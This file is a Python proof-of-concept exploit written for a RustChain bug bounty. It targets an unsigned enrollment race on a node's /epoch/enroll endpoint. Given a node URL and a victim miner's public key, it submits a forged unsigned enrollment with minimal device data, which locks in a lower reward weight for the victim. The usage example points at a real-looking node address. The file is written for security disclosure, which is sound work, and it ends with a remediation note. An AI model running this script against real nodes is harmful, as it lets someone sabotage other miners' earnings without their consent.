#!/usr/bin/env python3
"""
RustChain Security PoC — FINDING-1
Epoch Weight Downgrade via Unsigned Enrollment Race

Bounty: #2867 | Severity: HIGH | Reward: 50 RTC
Auditor: TestAutomaton (0x031a724e53b0AFC401AcEdC13595D47dd89bcb02)

Vulnerability:
  /epoch/enroll accepts UNSIGNED enrollment requests for backward compat.
  An attacker can enroll any known miner_pubkey with inferior device data,
  causing INSERT OR IGNORE to lock in low epoch weight before the legitimate
  miner gets a chance to enroll with their real hardware profile.

Impact:
  A G4 PowerBook miner (weight=2.5) could be locked to weight=1.0 for an
  entire epoch, reducing their reward share by 60%.

Usage:
  python3 poc_finding1_epoch_weight_downgrade.py <node_url> <victim_miner_pk>

Example:
  python3 poc_finding1_epoch_weight_downgrade.py https://50.28.86.131 RTC<40chars>
"""

import sys
import requests
import json
import time

def check_miner_attestation(node_url: str, miner_pk: str) -> bool:
    """Verify victim has recent attestation (required for enrollment)."""
    try:
        r = requests.get(f"{node_url}/balance/{miner_pk}", timeout=5)
        return r.status_code == 200
    except Exception:
        return False

def get_current_epoch(node_url: str) -> int:
    """Get current epoch number."""
    r = requests.get(f"{node_url}/epoch", timeout=5)
    return r.json().get("epoch", 0)

def attack_unsigned_enrollment(node_url: str, victim_pk: str) -> dict:
    """
    Enroll victim miner with inferior device data (no signature).
    
    The node's backward-compat path (lines 3479-3483) logs:
      "[ENROLL/SIG] UNSIGNED enrollment accepted for <pk>... (upgrade miner to signed flow)"
    
    This succeeds if:
    1. victim_pk has a recent attestation (ENROLL_REQUIRE_TICKET=1 satisfied)
    2. Attacker's request arrives before legitimate auto-enroll
    """
    epoch = get_current_epoch(node_url)
    print(f"[*] Current epoch: {epoch}")
    print(f"[*] Target miner: {victim_pk[:20]}...")
    print(f"[*] Submitting unsigned enrollment with minimal device data...")
    
    # No 'signature' or 'public_key' → triggers unsigned backward-compat path
    payload = {
        "miner_pubkey": victim_pk,
        "miner_id": victim_pk,
        "device": {
            "family": "x86",          # Modern x86: weight 1.0 (vs 2.5 for PowerPC G4)
            "arch": "default",        # Minimal weight architecture
            "device_arch": "x86_64",
            "cores": 1,
            "memory_gb": 1,
        },
        # NOTE: Deliberately omitting 'signature' and 'public_key' fields
        # This triggers the backward-compat unsigned path at lines 3479-3483
    }
    
    try:
        r = requests.post(f"{node_url}/epoch/enroll", json=payload, timeout=10)
        data = r.json()
        
        if data.get("ok"):
            weight = data.get("weight", 0)
            hw_weight = data.get("hw_weight", weight)
            print(f"[+] SUCCESS: Enrolled with weight={weight:.10f}")
            print(f"[+] Hardware weight: {hw_weight}")
            print(f"[+] Legitimate G4 PowerBook weight would be: ~2.5")
            print(f"[+] Weight reduction: {2.5 / max(weight, 1e-10):.0f}x less rewards")
            return {"success": True, "weight": weight, "epoch": epoch}
        else:
            error = data.get("error", "unknown")
            print(f"[-] Failed: {error}")
            if error == "no_recent_attestation":
                print("    Note: victim has no recent attestation — prerequisite not met")
            elif error == "attestation_expired":
                print("    Note: victim's attestation expired — window closed")
            return {"success": False, "error": error}
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error: {e}")
        return {"success": False, "error": str(e)}


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <node_url> <victim_miner_pk>")
        print(f"Example: {sys.argv[0]} https://50.28.86.131 RTC<40chars>")
        sys.exit(1)
    
    node_url = sys.argv[1].rstrip('/')
    victim_pk = sys.argv[2]
    
    print("=" * 60)
    print("RustChain Security PoC: Epoch Weight Downgrade Attack")
    print("FINDING-1 — Unsigned Enrollment Race (HIGH)")
    print("=" * 60)
    
    # Verify victim exists
    if not check_miner_attestation(node_url, victim_pk):
        print(f"[-] Miner {victim_pk[:20]}... not found in network")
        sys.exit(1)
    
    # Execute attack
    result = attack_unsigned_enrollment(node_url, victim_pk)
    
    print()
    print("=" * 60)
    print("REMEDIATION: Add RC_ENROLL_REQUIRE_SIG=1 env variable")
    print("or enforce sig requirement in /epoch/enroll route")
    print("=" * 60)
    
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
